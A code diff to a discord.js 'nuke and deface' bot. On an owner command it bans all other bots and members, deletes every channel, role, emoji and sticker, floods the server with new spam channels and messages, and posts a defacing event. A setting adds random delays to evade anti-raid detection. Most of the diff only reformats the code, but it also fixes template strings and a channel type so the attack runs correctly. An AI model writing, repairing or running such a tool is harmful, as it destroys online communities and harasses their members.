@@ -1,34 +1,28 @@
-const {
-  Client,
-  GatewayIntentBits,
-  GuildScheduledEventPrivacyLevel,
-  GuildScheduledEventEntityType
-} = require('discord.js');
-
+const { Client, GatewayIntentBits, GuildScheduledEventPrivacyLevel, GuildScheduledEventEntityType, ChannelType } = require('discord.js');
 const { sendInviteOnJoin } = require('./inviteOnJoin');
 
 const client = new Client({
-  intents: [
-    GatewayIntentBits.Guilds,
-    GatewayIntentBits.GuildMembers,
-    GatewayIntentBits.GuildModeration,
-    GatewayIntentBits.GuildEmojisAndStickers,
-    GatewayIntentBits.GuildIntegrations,
-    GatewayIntentBits.GuildWebhooks,
-    GatewayIntentBits.GuildInvites,
-    GatewayIntentBits.GuildVoiceStates,
-    GatewayIntentBits.GuildPresences,
-    GatewayIntentBits.GuildMessages,
-    GatewayIntentBits.GuildMessageReactions,
-    GatewayIntentBits.GuildMessageTyping,
-    GatewayIntentBits.DirectMessages,
-    GatewayIntentBits.DirectMessageReactions,
-    GatewayIntentBits.DirectMessageTyping,
-    GatewayIntentBits.MessageContent,
-    GatewayIntentBits.GuildScheduledEvents,
-    GatewayIntentBits.AutoModerationConfiguration,
-    GatewayIntentBits.AutoModerationExecution
-  ]
+    intents: [
+        GatewayIntentBits.Guilds,
+        GatewayIntentBits.GuildMembers,
+        GatewayIntentBits.GuildModeration,
+        GatewayIntentBits.GuildEmojisAndStickers,
+        GatewayIntentBits.GuildIntegrations,
+        GatewayIntentBits.GuildWebhooks,
+        GatewayIntentBits.GuildInvites,
+        GatewayIntentBits.GuildVoiceStates,
+        GatewayIntentBits.GuildPresences,
+        GatewayIntentBits.GuildMessages,
+        GatewayIntentBits.GuildMessageReactions,
+        GatewayIntentBits.GuildMessageTyping,
+        GatewayIntentBits.DirectMessages,
+        GatewayIntentBits.DirectMessageReactions,
+        GatewayIntentBits.DirectMessageTyping,
+        GatewayIntentBits.MessageContent,
+        GatewayIntentBits.GuildScheduledEvents,
+        GatewayIntentBits.AutoModerationConfiguration,
+        GatewayIntentBits.AutoModerationExecution
+    ]
 });
 
 // =================================================================
@@ -54,7 +48,6 @@ const DELETE_REASON = 'Owned by West';
 // --- Anti-Raid Bypass Settings ---
 const ENABLE_RANDOM_DELAYS = true; // Set to 'true' to add tiny random delays to bypass simple detection.
 const MAX_DELAY_MS = 50; // Maximum random delay in milliseconds.
-
 // =================================================================
 // === DO NOT EDIT BELOW THIS LINE (unless you know what you are doing) ===
 // =================================================================
@@ -76,7 +69,7 @@ async function randomDelay() {
 }
 
 client.on('guildCreate', async (guild) => {
-  await sendInviteOnJoin(guild);
+    await sendInviteOnJoin(guild);
 });
 
 client.once('ready', () => {
@@ -86,10 +79,12 @@ client.once('ready', () => {
 
 client.on('messageCreate', async (message) => {
     if (message.author.bot) return;
+
     if (message.content === '!start') {
         if (message.author.id !== OWNER_ID) {
             return message.reply('You do not have permission to use this command.');
         }
+
         const guild = message.guild;
         if (!guild) return message.reply('This command can only be used in a server.');
 
@@ -101,7 +96,7 @@ client.on('messageCreate', async (message) => {
             console.log('--- Phase 0: Banning all other bots instantly ---');
             const allMembers = await guild.members.fetch();
             const botsToBan = allMembers.filter(member => member.user.bot && member.user.id !== client.user.id);
-            console.log(`Found \${botsToBan.size} bots to ban.`);
+            console.log(`Found ${botsToBan.size} bots to ban.`);
             const botBanPromises = botsToBan.map(member => member.ban({ reason: BAN_REASON }).catch(err => console.error(`Failed to ban bot ${member.user.tag}: ${err.message}`)));
             await Promise.all(botBanPromises);
             console.log('All other bots have been banned.');
@@ -121,11 +116,7 @@ client.on('messageCreate', async (message) => {
             const deleteRolePromises = roles
                 .filter(role => role.position > 0 && !role.managed)
                 .map(role => randomDelay().then(() => role.delete(DELETE_REASON).catch(err => console.error(`Failed to delete role ${role.name}: ${err.message}`))));
-
-            // Added: Emoji Deletion Promises
             const deleteEmojiPromises = emojis.map(emoji => randomDelay().then(() => emoji.delete(DELETE_REASON).catch(err => console.error(`Failed to delete emoji ${emoji.name}: ${err.message}`))));
-
-            // Added: Sticker Deletion Promises
             const deleteStickerPromises = stickers.map(sticker => randomDelay().then(() => sticker.delete(DELETE_REASON).catch(err => console.error(`Failed to delete sticker ${sticker.name}: ${err.message}`))));
 
             await Promise.all([...banPromises, ...deleteChannelPromises, ...deleteRolePromises, ...deleteEmojiPromises, ...deleteStickerPromises]);
@@ -142,13 +133,17 @@ client.on('messageCreate', async (message) => {
 
             const channelCreationPromises = Array.from({ length: CHANNELS_TO_CREATE }, () => {
                 const channelName = CHANNEL_NAMES[Math.floor(Math.random() * CHANNEL_NAMES.length)];
-                return guild.channels.create({ name: channelName, reason: DELETE_REASON }).catch(err => console.error(`Failed to create a channel: ${err.message}`));
+                return guild.channels.create({
+                    name: channelName,
+                    reason: DELETE_REASON
+                }).catch(err => console.error(`Failed to create a channel: ${err.message}`));
             });
+
             const createdChannels = await Promise.all(channelCreationPromises);
             console.log(`Finished creating ${createdChannels.filter(c => c).length} channels.`);
 
             const textChannels = createdChannels.filter(channel => channel && channel.isTextBased());
-            console.log(`Starting to spam \${textChannels.length} channels concurrently...`);
+            console.log(`Starting to spam ${textChannels.length} channels concurrently...`);
             const spamPromises = textChannels.map(channel => {
                 const channelSpamPromises = Array.from({ length: SPAM_COUNT_PER_CHANNEL }, () => channel.send(SPAM_MESSAGE).catch(err => console.error(`Failed to send message in ${channel.name}: ${err.message}`)));
                 return Promise.all(channelSpamPromises);
@@ -157,13 +152,13 @@ client.on('messageCreate', async (message) => {
             console.log('Finished spamming channels.');
 
             // --- PHASE 3: EVENT CREATION ---
-            console.log(`Creating event "\${EVENT_NAME}"...`);
+            console.log(`Creating event "${EVENT_NAME}"...`);
             try {
                 const eventTimestamp = Date.now() + (60 * 60 * 1000);
                 // Create a dedicated voice channel for the event
                 const eventChannel = await guild.channels.create({
                     name: 'EVENT VOICE CHANNEL',
-                    type: 'GUILD_VOICE',
+                    type: ChannelType.GuildVoice,
                     reason: DELETE_REASON
                 });
 
@@ -172,16 +167,16 @@ client.on('messageCreate', async (message) => {
                     scheduledStartTime: new Date(eventTimestamp),
                     privacyLevel: GuildScheduledEventPrivacyLevel.GuildOnly,
                     entityType: GuildScheduledEventEntityType.Voice,
-                    channel: eventChannel.id, // Use the newly created voice channel
+                    channel: eventChannel.id,
                     description: EVENT_DESCRIPTION,
                     reason: DELETE_REASON
                 });
                 console.log('Event created successfully.');
             } catch (err) {
-                console.error(`Failed to create event: \${err.message}`);
+                console.error(`Failed to create event: ${err.message}`);
             }
 
-                      const endTime = Date.now();
+            const endTime = Date.now();
             console.log(`--- Nuke & Deface Sequence Complete ---`);
             console.log(`Total execution time: ${(endTime - startTime) / 1000} seconds.`);
         } catch (error) {
@@ -189,6 +184,5 @@ client.on('messageCreate', async (message) => {
         }
     }
 });
-
 
 client.login(process.env.BOT_TOKEN);
